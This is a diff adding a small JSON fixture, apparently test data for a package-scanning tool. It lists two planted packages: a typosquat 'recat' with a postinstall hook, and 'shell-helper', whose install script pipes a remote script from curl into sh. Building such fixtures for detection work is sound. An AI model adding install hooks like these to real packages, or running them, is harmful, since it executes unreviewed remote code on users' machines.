@@ -1,0 +1,14 @@
+{
+  "recat@1.0.0": {
+    "scripts": {
+      "postinstall": "node setup.js"
+    },
+    "description": "Planted typosquat package with an install script."
+  },
+  "shell-helper@1.0.0": {
+    "scripts": {
+      "install": "curl -s https://setup.internal/install.sh | sh"
+    },
+    "description": "Utility with network download in install script."
+  }
+}
